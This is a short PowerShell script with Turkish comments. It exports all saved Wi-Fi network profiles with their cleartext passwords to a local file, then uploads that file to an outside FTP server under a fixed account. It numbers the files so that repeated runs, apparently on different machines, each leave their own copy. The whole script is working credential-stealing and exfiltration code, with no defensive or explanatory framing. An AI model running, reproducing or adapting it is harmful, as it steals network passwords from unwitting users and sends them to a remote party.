$ftpHost = "ftp://ftpupload.net/"
$ftpUser = "if0_39536575"
$ftpPass = $env:FTP_PASS

if (-not $ftpPass) {
    Write-Error "FTP_PASS ortam değişkeni ayarlı değil!"
    exit 1
}

# FTP bağlantısı için WebClient oluştur
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

# Dosya listesi almak için FtpWebRequest
$ftpRequest = [System.Net.FtpWebRequest]::Create($ftpHost)
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

try {
    $response = $ftpRequest.GetResponse()
    $reader = New-Object System.IO.StreamReader $response.GetResponseStream()
    $fileList = @()
    while(-not $reader.EndOfStream) {
        $fileList += $reader.ReadLine()
    }
    $reader.Close()
    $response.Close()
}
catch {
    Write-Host "FTP klasör dosyaları alınamadı: $_"
    exit 1
}

# Mevcut wifipass dosyalarını filtrele
$existingFiles = $fileList | Where-Object { $_ -match '^wifipass(\d*)\.txt$' }

if ($existingFiles.Count -eq 0) {
    $newFileName = "wifipass.txt"
} else {
    $numbers = $existingFiles | ForEach-Object {
        if ($_ -match '^wifipass(\d+)\.txt$') { [int]$matches[1] } else { 1 }
    }
    $maxNum = ($numbers | Measure-Object -Maximum).Maximum
    $newFileName = "wifipass$($maxNum + 1).txt"
}

# Yerel dosya oluştur
$localFilePath = "$env:USERPROFILE\$newFileName"
netsh wlan show profile name="*" key=clear > $localFilePath

# FTP yükleme URL
$ftpUploadUrl = $ftpHost + $newFileName

try {
    $webclient.UploadFile($ftpUploadUrl, "STOR", $localFilePath)
    Write-Host "$newFileName dosyası FTP'ye başarıyla yüklendi."
}
catch {
    Write-Host "Dosya yüklenirken hata oluştu: $_"
}
